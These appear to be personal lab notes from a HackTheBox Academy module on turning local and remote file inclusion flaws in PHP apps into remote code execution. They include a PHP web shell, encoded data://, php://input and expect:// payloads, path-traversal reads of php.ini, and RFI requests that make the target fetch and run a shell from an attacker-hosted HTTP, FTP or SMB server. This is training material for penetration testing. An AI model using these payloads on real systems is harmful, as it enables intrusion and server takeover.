# Remote Code Execution

## PHP Wrappers

### Data

The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

**Checking PHP Configurations**

To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:

```shell-session
eldeim@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value:

```shell-session
eldeim@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Excellent! We see that we have this option enabled, so we can use the `data` wrapper. Knowing how to check for the `allow_url_include` option can be very important, as `this option is not enabled by default`, and is required for several other LFI attacks, like using the `input` wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.

### **Remote Code Execution**

With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

So, our first step would be to base64 encode a basic PHP web shell, as follows:

```shell-session
eldeim@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

We may also use cURL for the same attack, as follows:

```shell-session
eldeim@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

To repeat our earlier attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

```shell-session
eldeim@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

### Expect

Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:

```shell-session
eldeim@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

As we can see, the `extension` configuration keyword is used to enable the `expect` module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the `expect://` wrapper and then pass the command we want to execute, as follows:

```shell-session
eldeim@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, executing commands through the `expect` module is fairly straightforward, as this module was designed for command execution, as mentioned earlier. The [Web Attacks](https://academy.hackthebox.com/module/details/134) module also covers using the `expect` module with XXE vulnerabilities, so if you have a good understanding of how to use it here, you should be set up for using it with XXE.

These are the most common three PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover the `phar` and `zip` wrappers in upcoming sections, which we may use with web applications that allow file uploads to gain remote execution through LFI vulnerabilities.

### PoCs - Questions

* Try to gain RCE using one of the PHP wrappers and read the flag at /

First see the info of php.ini -->

```
http://94.237.60.55:39692/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

So now, use the wrapper with `data://text/plain;base64,`

```
eldeim@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

```

## Remote File Inclusion (RFI)

So far in this module, we have been mainly focusing on `Local File Inclusion (LFI)`. However, in some cases, we may also be able to include remote files "[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:

1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host

In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The [Server-side Attacks](https://academy.hackthebox.com/module/details/145) module covers various `SSRF` techniques, which may also be used with RFI vulnerabilities.

### Verify RFI

In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:

```shell-session
eldeim@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to `try and include a URL`, and see if we can get its content. At first, `we should always start by trying to include a local URL` to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (`http://127.0.0.1:80/index.php`) as our input string and see if it gets included:

```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

As we can see, the `index.php` page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the `index.php` page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.

We also see that we were able to specify port `80` and get the web application on that port. If the back-end server hosted any other local web applications (e.g. port `8080`), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.

> Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

### Remote Code Execution with RFI

The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:

```shell-session
eldeim@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like `80` or `443`, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.

#### HTTP

Now, we can start a server on our machine with a basic python server with the following command, as follows:

```shell-session
eldeim@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

Now, we can include our local shell through RFI, like we did earlier, but using `<OUR_IP>` and our `<LISTENING_PORT>`. We will also specify the command to be executed with `&cmd=id`:

```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command:

```shell-session
eldeim@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

#### FTP

As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:

```shell-session
eldeim@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the `ftp://` scheme in the URL, as follows:

```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

#### SMB

If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:

```shell-session
eldeim@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) as we did earlier:

```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is `more likely to work if we were on the same network`, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
